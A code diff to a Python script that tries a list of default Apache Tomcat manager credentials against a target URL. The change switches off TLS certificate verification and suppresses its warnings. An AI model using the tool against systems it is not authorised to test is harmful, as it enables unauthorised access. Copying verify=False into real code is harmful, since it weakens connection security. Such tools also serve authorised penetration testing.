@@ -11,11 +11,15 @@ So technically it's not bruteforcing :)
 
 import requests
 import argparse
+import urllib3
 
 """
 default Apache Tomcat credentials
 source: https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
 """
+
+urllib3.disable_warnings()
+
 credentials = [
     'admin:',
     'admin:admanager',
@@ -112,7 +116,8 @@ def brute(args):
         print("[.] checking {}:{}..................................................\r".format(login, password), end="")
         resp = requests.get(
             url=url,
-            auth=(login, password)
+            auth=(login, password),
+            verify=False
         )
 
         # 401 Unauthorized ?
